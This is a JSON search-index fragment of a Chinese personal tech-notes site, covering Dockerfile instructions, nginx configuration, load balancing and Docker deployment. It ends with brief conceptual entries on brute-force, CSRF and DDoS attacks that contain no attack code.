基于Dockerfile自行编写指令，基于指令流程创建镜像 注解 前置知识: 镜像是分层的; 容器以镜像为基础层, 本身为运行时存储层 关键字 每一句关键字指令都会生成一个镜像层 FROM 必须 , 基于的基础镜像, 比如 debian, 没有基础镜像, 没法运行上面的层 RUN 执行什么指令, 比如: apt install xxx VOLUME 设置卷，挂载主机目录; 如建立的数据目录,\n比如: # 将 /var/lib/xxx 设置为挂载卷(mount)\nVOLUME /var/lib/xxx\n\n# 将容器内的 /var/lib/xxx 文件夹，在容器运行时，\n# 该目录自动挂载为匿名卷，任何向该目录中写入数据的操作，\n# 都不会被容器记录，保证的容器存储层无状态理念 如果有多个: VOLUME [\"/var/lib/xxx\", \"/var/lib/xxx2\", \"/var/lib/xxx3\", ...] 容器在运行时，应该保证在存储层不写入任何数据，运行在容器内产生的数据，\n推荐是 挂载，写入到宿主机上，进行维护。 如果run的时候没有-v手动指定挂载, 指定的内容会自动挂载到宿主机, 可以使用: docker inspect $container_name 检查挂载的位置 MAINTAINER 指定维护者信息，可以没有 ADD COPY宿主机的文件到容器内, 会自动解压 还支持 URL 下载链接, 权限默认600, 但是这时不会解压(如果是压缩包) 官方更推荐COPY, 因为ADD包含了更多复杂的功能，且ADD会使构建缓存失效，导致镜像构建缓慢 WORKDIR 设置当前工作目录 USER 设置当前用户 EXPOSE 指定容器运行时对外提供的端口服务， 帮助使用该镜像的人，快速理解该容器的一个端口业务 相关指令: docker port 容器  # 查看已经映射的端口\ndocker run -p 宿主机端口：容器端口\ndocker run -P     # 作用是随机宿主机端口：容器内端口 CMD 指定容器启动后的要干的事情,\n语法: CMD [\"参数1\", \"参数2\"] 与直接在docker run 最后写command效果一致.\n即该镜像在运行容器实例的时候，执行的具体参数是什么,\n如: docker run -it debian bash  # 注意这里的优先级高于CMD的, 也就是如果指定了会覆盖CMD的 定义\n# 就相当于dockerfile的\nCMD [\"bash\"] 貌似很多默认行为就是: CMD [\"/bin/bash\"] 如果是多个要分开: CMD [\"cat\", \"/etc/debian_version\"] 如果指定了 ENTRYPOINT, CMD指定具体的参数就是传给 ENTRYPOINT ENV 设置环境变量;\n比如: ENV a 1 COPY COPY宿主机的文件到容器内, 不会自动解压 ENTRYPOINT 容器启动后执行的命令. 作用和CMD一样 当指定了 ENTRYPOINT, CMD指定具体的参数就是传给 ENTRYPOINT ARG 设置环境变量, 这点与ENV一致;\n区别在于: ENV 无论是在镜像构建时，还是容器运行，该变量都可以使用; ARG只是用于构建镜像需要设置的变量，容器运行时就消失了 创建 注解 创建的文件名必须时 Dockerfile / dockerfile 写好后构建出镜像: docker build . 经典问题: CMD systemctl start nginx\n\n这样的写法是错误的，容器会立即退出\n\n因为systemct1 start nginx是希望以守护进程形式启动nginx，且CMD命令会转化为\n\nCMD [\"sh\"，\"-C\"， \"systemctl start nginx\"]\n\n这样的命令主进程是sh解释器，执行完毕后立即结束了，因此容器也就退出了。\n\n因此正确的做法应该是CMD [\"nginx\"，\"-g\"，\"daemon off；\"]","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-dockerfile-writing.html","loc":"/yq-docs-Container-and-cluster-docker-dockerfile-writing.html"},{"title":"与其他产品对比","text":"什么情况下用nginx? 大流量, 性能 与Apache对比 什么情况下使用 Apache httpd ? 高并发 降低请求的切换成本 降低单请求的内存占用 对高频操作以空间换时间 Web容器 同步方式 阻塞方式","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-nginx-Compared-with-other-products.html","loc":"/yq-docs-Container-and-cluster-nginx-Compared-with-other-products.html"},{"title":"nginx配置管理","text":"参考: Nginx web server配置 管理 Nginx 进程 注解 关于 Master 和 Worker 进程, 见 NginxMasterAndWorker 有两种方式让修改后的配置文件生效： 停止 并 重启 Nginx 给`master`进程发送信号 信号可以通过以下方式发送(nginx是可执行文件): nginx -s signal 其中 signal 常用选项如下 quit - 优雅的关闭，即处理完当前请求再关闭 reload - 重新载入配置文件 reopen - 重新打开日志文件 stop - 立即关闭 也可以通过Linux的`kill`命令直接发送信号给`master`进程。Nginx的进程ID通常保存在`/usr/local/nginx/logs`或`/var/run`目录下的`nginx.pid`文件中。 使用变量 通过在配置文件中使用变量，可以让Nginx以不同的方式处理请求。\n变量的值在运行时计算获得，并可作为参数传递给指令。\n变量必须以`$`开头。变量基于Nginx的状态定义信息，如正被处理请求的属性。 Nginx包含许多预设的变量，如`core HTTP`变量集，也可以使用`set`、 map`和`geo`指令来自定义变量。\n大多数变量都在运行时计算值，这些值一般都包含某个请求的相关信息。\n如`$remote_addr`包含了IP地址，而`uri`则包含了当前访问的`URI 。 内置全局变量 变量: $args ：这个变量等于请求行中的参数，同$query_string\n$content_length ： 请求头中的Content-length字段。\n$content_type ： 请求头中的Content-Type字段。\n$document_root ： 当前请求在root指令中指定的值。\n$host ： 请求主机头字段，否则为服务器名称。\n$http_user_agent ： 客户端agent信息\n$http_cookie ： 客户端cookie信息\n$limit_rate ： 这个变量可以限制连接速率。\n$request_method ： 客户端请求的动作，通常为GET或POST。\n$remote_addr ： 客户端的IP地址。\n$remote_port ： 客户端的端口。\n$remote_user ： 已经经过Auth Basic Module验证的用户名。\n$request_filename ： 当前请求的文件路径，由root或alias指令与URI请求生成。\n$scheme ： HTTP方法（如http，https）。\n$server_protocol ： 请求使用的协议，通常是HTTP/1.0或HTTP/1.1。\n$server_addr ： 服务器地址，在完成一次系统调用后可以确定这个值。\n$server_name ： 服务器名称。\n$server_port ： 请求到达服务器的端口号。\n$request_uri ： 包含请求参数的原始URI，不包含主机名，如：\"/foo/bar.php?arg=baz\"。\n$uri ： 不带请求参数的当前URI，$uri不包含主机名，如\"/foo/bar.html\"。\n$document_uri ： 与$uri相同。 一些内置关键字 server_name 当配置了多个server时，且某个server有配置server_name时，会优先找server_name，就会访问不到我想要的那个server 另外，apt安装的nginx默认在 /etc/nginx/sites-available/default 下有一个默认的server配置，要避免于这个冲突或者直接删除 root 使用范围：可以在 server、http、location 表示路径拼接（一般配置静态资源），比如: location /img {\n        root /var/img/\n} 实际经过 root 之后的路径为: /img/var/img alias 使用范围：只能在 location 表示新路径（从根路径开始），比如: location /img {\n        alias /var/img/\n} 实际经过 alias 之后的路径为: /var/img 注解 实际使用注意分清 root 与 alias alias使用范围：只能在 location root使用范围：可以在 server、http、location 例子: # 访问 localhost/ui/some 时候 实际访问的是 /var/www/ui/build/static/some\n# 只认自己定义的别名，注意不加 / 会触发重定向到正确的路径\nlocation /ui/ {\n                alias /var/www/ui/build/static/ ;\n}\n\n# 访问 localhost/ui/some 时候 实际访问的是 /var/www/ui/build/static/ui/some\n# 会把 location前缀加进去\nlocation /ui/ {\n                root /var/www/ui/build/static/ ;\n} return return 状态码 字符串 第二个字符串可选，默认访问会以文件的形式下载 rewrite 实现对url的重写、重定向 格式: rewrite $正则 $替换内容 [flag标记] 例子: # 将url中的api去除\nlocation /ui {\n    rewrite \"&#94;/api/(.*)$\" /$1 break ;\n} break 在重写url后，不再重新匹配路径 last 在重写路径后，将得到的路径重新进行一次路径路径匹配 try_files 按照给定的文件列表匹配文件，访问找到的第一个文件， 若文件都没有匹配到，重新请求最后一个参数给的 url 格式: try_files file1 file2 ...(可以有多个file) url ~ 表示开启正则匹配 proxy_pass 反向代理 表示动态请求，需要进行请求转发（如转发到tomcat）（用法与root基本一致） upstream 负载均衡配置 反向代理中，我们通过proxy_pass来指定Tomcat的地址，\n很显然我们只能指定一台Tomcat地址，那么我们如果想指定多台来达到负载均衡呢？ 第一, 通过 upstream 来定义一组Tomcat，\n并指定负载策略（IPHASH、加权论调、最少连接）, 健康检查策略（Nginx可以监控这一组Tomcat的状态）等。 第二，将proxy_pass替换成upstream指定的值即可。 负载均衡可能带来的问题？ 负载均衡所带来的明显的问题是，一个请求，可以到A server，也可以到B server，\n这完全不受我们的控制，当然这也不是什么问题，\n只是我们得注意的是： 用户状态的保存问题，如Session会话信息，不能在保存到服务器上 斜杠的作用 被代理的路径加不加斜杠的情况,\n尝试访问 xx.xx.xx.xx/ui/img/img1.png # 实际访问的是 http://127.0.0.1:5555/img/img1.png\nlocation /ui/ {\n                proxy_pass http://127.0.0.1:5555/ ;\n}\n\n# 实际访问的是 http://127.0.0.1:5555/ui/img/img1.png\nlocation /ui/ {\n                proxy_pass http://127.0.0.1:5555 ;\n} 如何配置 配置详解 配置路径一般在 /etc/nginx/nginx.conf ,\n如果是lnmp环境安装, 配置文件可能是在 /usr/local/nginx/conf/nginx.conf 其他情况: 默认的配置文件位置: /usr/local/nginx/conf, /etc/nginx, or /usr/local/etc/nginx. 打开主配置文件: vim /usr/local/nginx/conf/nginx.conf 内容与解释: user                    # 设置nginx服务的系统使用用户\nworker_processes        # 工作进程数 一般情况与CPU核数保持一致\nerror_log               # nginx的错误日志\npid                     # nginx启动时的pid\n\nevents {\n        worker_connections    # 每个进程允许最大连接数\n        use                   # nginx使用的内核模型\n} 我们使用 nginx 的 http 服务，在配置文件 nginx.conf 中的 http 区域内，\n配置无数个 server ，每一个 server 对应这一个虚拟主机或者域名: http {\n        ... ...        #后面再详细介绍 http 配置项目\n\n        server {\n                listen 80                          #监听端口;\n                server_name localhost              #地址\n\n                location / {                       #访问首页路径\n                        root /xxx/xxx/index.html       #默认目录\n                        index index.html index.htm     #默认文件\n                        }\n\n                error_page  500 504   /50x.html    #当出现以上状态码时从新定义到50x.html\n                location = /50x.html {             #当访问50x.html时\n                        root /xxx/xxx/html             #50x.html 页面所在位置\n                        }\n                }\n\n        server {\n                ... ...\n                }\n\n        } 一个 server 可以出现多个 location ，我们对不同的访问路径进行不同情况的配置。 我们再来看看 http 的配置与含义: http {\n                sendfile  on                  # 高效传输文件的模式 一定要开启\n                keepalive_timeout   65        # 客户端服务端请求超时时间\n                log_format  main   XXX        # 定义日志格式 代号为main\n                access_log  /usr/local/access.log  main     # 日志保存地址 格式代码 main\n} 配置内容全部一览: # 配置http\nhttp {\n\n    server {        # 服务器配置，可以有多个server\n\n        listen 127.0.0.1:8080       # 监听的端口\n                                # 如果不填写端口，则采用标准端口。\n                                # 如果不填写ip地址，则监听所有地址。\n                                # 如果缺少整条listen指令，则标准端口是80/tcp，\n                                # 默认端口是8000/tcp，由超级用户的权限决定。\n\n        # 多个server配置了相同的ip地址和端口，Nginx会匹配server_name指令与请求头部的host字段。                  # server_name指令的参数可以是精确的文本、通配符或正则表达式。\n        server_name example.org www.example.org;\n\n        # 如果有多个server_name匹配host字段，Nginx根据以下规则选择第一个相匹配的server处理请求：\n        #   1、精确匹配\n        #   2、以*开始的最长通配符，如 *.example.org\n        #   3、以*结尾的最长通配符，如 mail.*\n        #   4、第一个匹配的正则表达式（根据在配置文件中出现的先后顺序）\n        # 如果找不到任何与host字段相匹配的server_name，Nginx会根据请求端口将其发送给默认的server。\n        # 默认server就是配置文件中第一个出现的server，\n        # 也可以通过default_server指定某个server为默认server，\n        # 如listen 0.0.0.0:8080 default_server\n\n\n        # 根据URL将请求发送给不同的代理/处理不同的文件请求。由server指令中的location指令配置规则。\n\n        # 匹配以/some/path/开始的请求URI\n        location /some/path/ {\n            ...\n        }\n\n        # ~  用于匹配区分大小写的正则表达式，\n        # ~* 用于匹配不区分大小写的正则表达式。\n\n        # 匹配任意包含.html或.htm的URI。\n        location ~ \\.html? {\n            ...\n        }\n\n        # Nginx先匹配前缀字符串，然后再匹配正则表达式。正则表达式拥有较高优先级，\n        # 除非使用&#94;~修饰符。在所有前缀字符串中，Nginx会挑选最精确的那个，也就是最长最匹配的那个。\n        # 详细匹配过程如下：\n        #   1、匹配所有前缀字符串；\n        #   2、如果有一个 = 定义的精确匹配前缀字符串，停止继续匹配；\n        #   3、如果 &#94;~ 在最长匹配的前缀字符串之前，将忽略正则表达式；\n        #   4、存储最长的匹配前缀字符串；\n        #   5、匹配正则表达式；\n        #   6、找到第一个相匹配的正则表达，停止匹配过程，并执行该location指令；\n        #   7、如果没有正则表达式匹配，则使用第4步存储的最长前缀字符串；\n\n        # = 修饰符的典型应用是匹配 /请求。\n        # 针对频繁访问/的情况，将location参数设置为= /可以加速处理过程，\n        # 因为整个匹配过程在第一条之后就结束了。\n        location = / {\n            ...\n        }\n\n\n        # location指令内可以配置如何处理请求：处理静态文档或将请求转发给代理服务器。\n        # 在下面的例子中，匹配第一个location的请求可以访问/data目录的文件，\n        # 匹配第二个location的请求将被转发到www.example.com服务器。\n        location /images/ {\n            # root指令指定了静态文件的文件系统路径，将与请求URI一起构成静态文件的完全路径\n            root /data;\n        }\n\n        location / {\n            # proxy_pass指令将请求转发到代理服务器，并将代理服务器的响应返回给客户端。\n            proxy_pass http://www.example.com;\n        }\n\n        # sub_filter指令支持重写或修改HTTP请求的响应内容，如替换某个字符串。该指令支持变量和链式替换。\n        # 将指向服务器的链接改为指向代理服务器的链接：\n        location / {\n            sub_filter      /blog/ /blog-staging/;\n            sub_filter_once off;\n        }\n        # 将http请求改为https请求，并将请求头部的本地主机地址改为主机名。\n        # sub_filter_once指令用于告诉Nginx是否连续执行location中的sub_filter指令。\n        # 注意：被sub_filter指令修改后的内容将不会再被其他sub_filter指令修改。\n        location / {\n            sub_filter     'href=\"http://127.0.0.1:8080/'    'href=\"https://$host/';\n            sub_filter     'img src=\"http://127.0.0.1:8080/' 'img src=\"https://$host/';\n            sub_filter_once on;\n        }\n\n        # error_page指令用于返回一个自定义错误页面和一个错误代码、\n        # 修改响应中的错误代码或重定向到不同的URI。\n        # 当Nginx未能找到请求的页面时，不会返回404，而会返回303和一个重定向到新页面指令。\n        # 这通常用于处理客户端访问旧地址的情况。\n        location /old/path.html {\n            error_page 404 =301 http:/example.com/new/path.html;\n        }\n\n        # 有些网站在处理错误或重定向时，会要求立即返回一个状态码。最简单的方式就是使用return指令\n        location /wrong/url {\n            return 404;\n        }\n        # return指令的第一个参数是一个状态码。\n        # 第二个是可选参数，可以是重定向的URL（当状态码是301、302、303和307时），\n        # 也可以是返回的文本信息。\n        location /permanently/moved/url {\n            return 301 http://www.example.com/moved/here;\n        }\n\n        # 处理请求过程中，可以通过rewrite指令重复修改请求的URI。\n        # rewrite指令包含2个必填参数和1个可选参数。\n        # 第一个参数是请求URI必须匹配的正则表达式。第二个参数是要替换的目标URI。\n        # 第三个为可选参数，可以是一个是否继续执行后续rewrite指令的标记，\n        # 也可以发送一个重定向指令(状态码是301或302)。\n        location /users/ {\n            rewrite &#94;/users/(.*)$ /show?user=$1 break;\n        }\n\n    }\n\n    # location和server中都可以包含多个rewrite指令。\n    # Nginx从上到下依次磁性rewrite指令，每次进入server指令块时，rewrite指令都会被执行一次。\n    # Nginx执行完一系列rewrite指令后，根据最新的URI来选择location指令。\n    # 如果location中也包含rewrite指令，它们也将被依次执行，执行完毕后将重新选择location。\n    server {\n        ...\n        rewrite &#94;(/download/.*)/media/(.*)\\..*$ $1/mp3/$2.mp3 last;\n        rewrite &#94;(/download/.*)/audio/(.*)\\..*$ $1/mp3/$2.ra  last;\n        return  403;\n        ...\n    }\n    # 这个例子用于区分两套不同的URI。\n    # 类似于/download/some/media/file的URI将被改写为/download/some/mp3/file.mp3。\n    # 由于最后的标识last，Nginx将忽略随后的两条指令，然后以新的URI继续处理请求。\n    # 同样地，类似于/download/some/audio/file的URI将被改写为/download/some/mp3/file.ra。\n    # 如果请求URI都不匹配上述两条rewrite指令，Nginx将返回403错误代码。\n\n    # rewrite指令可以包含以下两种参数，用于中断处理过程：\n    #       last - 停止执行当前server或location中的rewrite指令，并以新的URI查找新的location；\n    #       break - 停止执行当前上下文环境内的rewrite指令，并不以新的URI查找新的location；\n\n\n    # 以下例子中，当访问一个不存在的文件时，Nginx会将请求重定向到http://backend。\n    # 由于error_page指令未指定重定向代码，该代码将由重定向后的http://backend返回。\n    # 当请求文件未找到时，error_page指令将发起一个内部重定向。\n    # $url变量持有当前请求的URI，并被传递给重定向。\n    # 假设请求的/images/some/file文件未找到，将被重定向到/fetch/images/some/file，\n    # 同时搜索新的location。最终，请求将被第二个location处理，并被代理到http://backend。\n    # open_file_cache_errors指令可用于未找到请求文件时，禁止产生错误消息。\n    # 在下例中可以忽略，因为错误已被正确处理。\n    server {\n        ...\n        location /images/ {\n            # Set the root directory to search for the file\n            root /data/www;\n\n            # Disable logging of errors related to file existence\n            open_file_cache_errors off;\n\n            # Make an internal redirect if the file is not found\n            error_page 404 = /fetch$uri;\n        }\n\n        location /fetch/ {\n            proxy_pass http://backend/;\n        }\n    }\n\n} 本地实际配置尝试 配置前端: location /static {\n                alias /var/www/ui/build/static ;    # 静态资源映射\n}\n\nlocation /ui/ {\n                alias /var/www/ui/build/ ;      # 前端ui资源\n                try_files $uri $uri/ index.html\n}\n\nlocation / {\n                rewrite / /ui/ ;    # 所有没匹配到的请求都交给 /ui/处理\n}","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-nginx-Configuration.html","loc":"/yq-docs-Container-and-cluster-nginx-Configuration.html"},{"title":"nginx概念详解","text":"Nginx联合创始人安德鲁·阿列克谢夫（Andrew Alexeev）曾说：\nNginx是为对Apache性能不满意的人而构建的。随着Internet需求的变化，Web服务器的工作也在变化。\nNginx的构建比以往任何时候都更有效率，更可扩展，更安全，更强大。 本文提供了Nginx的基本概念及知识。以开发者必备的Nginx基础知识为主，罗列了一些Nginx教程，希望对大家有所帮助。 Nginx的产生 Nginx 同 Apache 一样都是一种 Web 服务器。\n基于 REST 架构风格，以统一资源描述符（Uniform Resources Identifier）URI\n或者统一资源定位符（Uniform Resources Locator）URL 作为沟通依据，通过 HTTP 协议提供各种网络服务。 然而，这些服务器在设计之初受到当时环境的局限，\n例如当时的用户规模，网络带宽，产品特点等局限并且各自的定位和发展都不尽相同。\n这也使得各个 Web 服务器有着各自鲜明的特点。 Apache 的发展时期很长，而且是毫无争议的世界第一大服务器。它有着很多优点：稳定、开源、跨平台等等。 它出现的时间太长了，它兴起的年代，互联网产业远远比不上现在。所以它被设计为一个重量级的。 它不支持高并发的服务器。在 Apache 上运行数以万计的并发访问，会导致服务器消耗大量内存。 操作系统对其进行进程或线程间的切换也消耗了大量的 CPU 资源，导致 HTTP 请求的平均响应速度降低。 这些都决定了 Apache 不可能成为高性能 Web 服务器，轻量级高并发服务器 Nginx 就应运而生了。 俄罗斯的工程师 Igor Sysoev，他在为 Rambler Media 工作期间，使用 C 语言开发了 Nginx。 Nginx 作为 Web 服务器一直为 Rambler Media 提供出色而又稳定的服务。然后呢，Igor Sysoev 将 Nginx 代码开源，并且赋予自由软件许可证。 由于以下这几点，所以，Nginx 火了 Nginx 使用基于事件驱动架构，使得其可以支持数以百万级别的 TCP 连接。 高度的模块化和自由软件许可证使得第三方模块层出不穷（这是个开源的时代啊）。 Nginx 是一个跨平台服务器，可以运行在 Linux、Windows、FreeBSD、Solaris、AIX、Mac OS 等操作系统上。 这些优秀的设计带来的极大的稳定性。 Nginx 基本概念 正向代理与反向代理 为了便于理解，首先先来了解一下一些基础知识，nginx是一个高性能的反向代理服务器那么什么是反向代理呢？ 代理是在服务器和客户端之间假设的一层服务器，代理将接收客户端的请求并将它转发给服务器，然后将服务端的响应转发给客户端。 不管是正向代理还是反向代理，实现的都是上面的功能。 如果对OSI 七层模型与 TCP/IP 四层模型不是很熟悉可以再回顾下 正向代理 正向代理（forward）意思是一个位于客户端和原始服务器 (origin server) 之间的服务器，\n为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标 (原始服务器)，\n然后代理向原始服务器转交请求并将获得的内容返回给客户端。 正向代理是为我们服务的，即为客户端服务的，客户端可以根据正向代理访问到它本身无法访问到的服务器资源。 正向代理对我们是透明的，对服务端是非透明的，即服务端并不知道自己收到的是来自代理的访问还是来自真实客户端的访问。 反向代理 反向代理（Reverse Proxy）方式是指以代理服务器来接受 internet 上的连接请求，\n然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，\n此时代理服务器对外就表现为一个反向代理服务器。 反向代理是为服务端服务的，反向代理可以帮助服务器接收来自客户端的请求，帮助服务器做请求转发，负载均衡等。 反向代理对服务端是透明的，对我们是非透明的，即我们并不知道自己访问的是代理服务器，而服务器知道反向代理在为他服务。 负载均衡 如果请求数过大，单个服务器解决不了，我们增加服务器的数量，然后将请求分发到各个服务器上，\n将原先请求集中到单个服务器的情况改为请求分发到多个服务器上，就是负载均衡。 Upstream 指定后端服务器地址列表，在 server 中拦截响应请求，并将请求转发到 Upstream 中配置的服务器列表: upstream balanceServer {\n    server 10.1.22.33:12345;\n    server 10.1.22.34:12345;\n\n    server 10.1.22.35:12345;\n    }\n\nserver {\n    server_name  fe.server.com;\n    listen 80;\n    location /api {\n        proxy_pass http://balanceServer;\n        }\n    } 上面的配置只是指定了 nginx 需要转发的服务端列表，并没有指定分配策略。 默认情况下采用的是轮询策略，将所有客户端请求轮询分配给服务端。\n这种策略是可以正常工作的，但是如果其中某一台服务器压力太大，出现延迟，会影响所有分配在这台服务器下的用户。 Nginx支持的负载均衡调度算法 weight轮询(默认，常用) 接收到的请求按照权重分配到不同的后端服务器，\n即使在使用过程中，某一台后端服务器宕机，Nginx会自动将该服务器剔除出队列，\n请求受理情况不会受到任何影响。这种方式下，\n可以给不同的后端服务器设置一个权重值(weight)，用于调整不同的服务器上请求的分配率；\n权重数据越大，被分配到请求的几率越大；\n该权重值，主要是针对实际工作环境中不同的后端服务器硬件配置进行调整的。 ip_hash（常用） 每个请求按照发起客户端的ip的hash结果进行匹配，\n这样的算法下一个固定ip地址的客户端总会访问到同一个后端服务器，\n这也在一定程度上解决了集群部署环境下session共享的问题。 fair 智能调整调度算法，动态的根据后端服务器的请求处理到响应的时间进行均衡分配，\n响应时间短处理效率高的服务器分配到请求的概率高，响应时间长处理效率低的服务器分配到的请求少；\n结合了前两者的优点的一种调度算法。\n但是需要注意的是Nginx默认不支持fair算法，如果要使用这种调度算法，\n请安装upstream_fair模块。 url_hash 按照访问的url的hash结果分配请求，每个请求的url会指向后端固定的某个服务器，\n可以在Nginx作为静态服务器的情况下提高缓存效率。\n同样要注意Nginx默认不支持这种调度算法，要使用的话需要安装Nginx的hash软件包。 动静分离 为了加快服务器的解析速度，可以把动态页面和静态页面交给不同的服务器来解析，加快解析速度，降低原来单个服务器的压力。 Master 和 Worker 进程 Nginx包含一个`master`进程和一到多个`worker`进程。如果配置了`缓存`的话，还将包含`缓存加载进程`和`缓存管理进程`。 master 进程主要负责读取配置文件，并控制管理`workder`进程。 worker 进程负责处理请求。Nginx基于操作系统的调度机制高效地在`worker`进程间分配请求。可以在`nginx.conf`配置文件中设置`worker`进程的数量，一般设置为服务器的CPU内核数。 为什么选择Nginx Nginx是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器；\n同时也是一个IMAP、POP3、SMTP代理服务器；\nNginx可以作为一个HTTP服务器进行网站的发布处理，\n另外Nginx可以作为反向代理进行负载均衡的实现。在Nginx网站上，其功能包括： HTTP和HTTPS（TLS / SSL / SNI） 超快速的Web服务器用于静态内容 FastCGI，WSGI，SCGI用于动态内容 具有负载平衡和缓存功能的加速Web代理 不间断实时二进制升级和配置 压缩和内容过滤器 虚拟主机 FLV和MP4的媒体流 带宽和连接策略 全面的访问控制 自定义日志 嵌入式脚本 带有TLS的SMTP / IMAP / POP3的邮件代理 逻辑，灵活，可扩展的配置 在Linux，FreeBSD，Mac OS X，Solaris和Windows上运行 Nginx有如下优势 IO多路复用epoll（IO复用） 如何理解呢？举个例子吧！ 有A、B、C三个老师，他们都遇到一个难题，要帮助一个班级的学生解决课堂作业。 老师A采用从第一排开始一个学生一个学生轮流解答的方式去回答问题，\n老师A浪费了很多时间，并且有的学生作业还没有完成呢，老师就来了，反反复复效率极慢。 老师B是一个忍者，他发现老师A的方法行不通，于是他使用了影分身术，分身出好几个自己同一时间去帮好几个\n同学回答问题，最后还没回答完，老师B消耗光了能量累倒了。 老师C比较精明，他告诉学生，谁完成了作业举手，有举手的同学他才去指导问题，\n他让学生主动发声，分开了\"并发\"。这个老师C就是Nginx。 轻量级 功能模块少 - Nginx仅保留了HTTP需要的模块，其他都用插件的方式，后天添加 代码模块化 - 更适合二次开发，如阿里巴巴Tengine CPU亲和 把CPU核心和Nginx工作进程绑定，把每个worker进程固定在一个CPU上执行，减少切换CPU的cache miss，从而提高性能。","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-nginx-Detailed-concept.html","loc":"/yq-docs-Container-and-cluster-nginx-Detailed-concept.html"},{"title":"docker部署nginx","text":"大概指令: docker pull nginx\ndocker run --name mynginx -d -p 80:80 -v /Users/yanque/project/new_doc_rst/build/html:/usr/share/nginx/html nginx 首先本地目录要有html项目, 我的在 /Users/yanque/project/new_doc_rst/build/html , 映射上去. 然后本地打开 localhost访问即可, 局域网内可用内网ip打开.","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-nginx-docker-deploy-nginx.html","loc":"/yq-docs-Container-and-cluster-nginx-docker-deploy-nginx.html"},{"title":"指令","text":"语法: nginx -s signal signal支持的 stop: 快速停止 quit: 优雅终止(会等待worker完成所有请求);\n也支持使用系统的kill发送: kill -s QUIT nginx的pid 默认情况下, pid文件  nginx.pid 在以下目录: /usr/local/nginx/logs\n/var/run reload: 重载配置文件;\n当master收到这个信号的时候,\n会先检查配置文件有没有语法问题, 没有的话, 给正在运行的worker发送终止信号(相当于quit),\n并启动新的worker; reopen: 重新打开日志文件","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-nginx-instruction.html","loc":"/yq-docs-Container-and-cluster-nginx-instruction.html"},{"title":"安全领域的AI-思考","text":"逛V2看到的: https://mp.weixin.qq.com/s/q1i_VpNaxxmokutayI-i_g","tags":"安全","url":"/yq-docs-Safety-AI-in-the-field-of-security.html","loc":"/yq-docs-Safety-AI-in-the-field-of-security.html"},{"title":"暴力破解","text":"一般针对密码而言，\n弱密码（Weak Password）很容易被别人（对你很了解的人等）猜到或被破解工具暴力破解。","tags":"安全","url":"/yq-docs-Safety-Common-loopholes-Bandage-crack.html","loc":"/yq-docs-Safety-Common-loopholes-Bandage-crack.html"},{"title":"CSRF攻击","text":"CSRF攻击，全称是跨站请求伪造（Cross-site request forgery），\n它可以利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。 例子 绝大多数90，00后都遇到过CSRF攻击，具体CSRF攻击是什么？ 记得上初中的时候，QQ空间经常会看到这样的说说: \"今天是马化腾的生日，转发这条说说到10个群免费赠送一个月VIP。\"\n\n\"转发这条说说，免费领取一年黄钻/红钻/蓝钻/粉钻。\"\n\n\"大家好，我是易烊千玺，这是我的QQ号*********，欢迎各位小伙伴加我QQ。\" 上大学后，QQ邮箱又会收到这样的邮件: 发件人：\"教务处\"\n内容为：\"##大学##系2022年上学期期末考试成绩单\"或者\"##大学2022年下学期课程安排\"等，这些邮件中还很默契的都放一个链接 即便是现在，玩QQ的都遇到过，莫名其妙的收到陌生人发来的一份在线共享文档，\n内容为：\"##年下半年四六级成绩报告\"； 还有你QQ列表中那些被盗号的朋友是不是总会发些链接给你，点开以后发现手机卡死了。 近几年新闻报道的链接诈骗数不胜数，家里的爷爷奶奶，爸爸妈妈，\n甚至七大姑八大姨微信发给你的\"点开链接并转发10个群即可领取100元现金红包\"等等… 这些只是CSRF攻击的冰山一角，那CSRF攻击到底是什么呢？ CSRF（跨站域请求伪造）攻击虽然只是一种极为普通的攻击方式，\n但是它覆盖面极广，而且大部分人防范意识薄弱，导致它流行了10多年，仍然经久不衰。 它核心思想在于，用户在打开A网站的情况下，如果在Tab页面打开了被CSRF攻击过的恶意网站B，\n那此时在B页面的\"唆使\"下，用户自身浏览器会发起一个对网站A的HTTP请求。 这么一听好像也没什么厉害的，普普通通，\n但是CSRF攻击最致命的一点是：\n这个HTTP请求不是用户的主动意图，而是B网页\"唆使\"的，\n如果是一个危害较大的请求操作（比如发邮件？删数据？伪造信息贷款？等等）那就麻烦了。 其次，因为在攻击之前用户已经打开了A网站，\n浏览器会存有A网站下发的Cookie或其他用于身份认证的信息，\n这次被\"唆使\"的请求，将会自动带上这些信息，\n导致A网站后端分不清楚这是否是用户真实的意愿还是\"伪请求\"。 随着用户被\"唆使\"时间的延长，这些类似蠕虫的恶意请求会一步一步挖空你的信息，严重的可能引导A网站直接转账。 这也就不难理解为何很多被CSRF攻击到的人明明什么都没做，只是点开了链接，钱就失踪了。 当你打开手机，在搜索栏输入你想搜索的内容，按下回车的那一刻开始，\n你的上网信息已经汇报给网络管理者（注：属于合法行为，官方只收集你的网址，对你进行上网保护） 但并不是所有人都这么做，更多的情况是攻击者会监控你的一举一动，\n获取你的个人信息后转卖给某些非法组织或非法盈利机构。\n但这种类型的网站也很好分辨，细心的人会发现，有些网址开头是http，有些是https。 http 超文本传输协议，简单来说就是用明文的方式传输数据。 https 安全套结字层超文本传输协议，即加密传输数据。 所以当你在http开头的网站上输入支付密码、身份证号、银行卡等等重要信息的时候，\n攻击者通过截获明文数据，这些内容将直接泄漏给攻击者。 就好比你在银行ATM机存钱的时候，输入卡号和密码的同时被ATM机明文广播。 尽管细思极恐，但绝不是在夸大其辞，在网络攻击者看来，只是输入几行命令那么简单的事。 不过目前大部分网站都已经采用https加密传输协议，\n除了某些境外的\"学习网站\"和少数标记为广告的网站仍在采用http协议（具体原因不用我多说了吧）","tags":"安全","url":"/yq-docs-Safety-Common-loopholes-CSRF-attack.html","loc":"/yq-docs-Safety-Common-loopholes-CSRF-attack.html"},{"title":"DDoS攻击","text":"DDoS全称是分布式拒绝服务攻击（Distributed Denial of Service）,\n属于是最没技术含量但攻击起来最让人头疼的一种。攻击者不断地提出服务请求，\n让合法用户的请求无法及时处理，这是 DoS 攻击。 而DDoS 攻击是攻击者使用多台计算机或者计算机集群进行 DoS 攻击 